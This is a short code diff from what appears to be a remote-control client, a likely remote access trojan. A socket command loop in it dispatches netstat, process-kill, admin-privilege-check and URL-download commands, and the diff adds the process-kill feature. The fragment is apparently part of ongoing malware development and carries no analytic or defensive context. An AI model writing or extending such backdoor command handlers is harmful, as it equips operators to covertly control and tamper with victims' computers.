@@ -33,7 +33,7 @@ def run(host, port):
             elif command == "netstat":
                 execute_netstat(client_socket)
             elif command[:4] == "kill":
-                pass
+                kill_process(client_socket, command[5:])
             elif command == "cpl":
                 check_admin_privileges(client_socket)
             elif command[:6] == "urldwn":
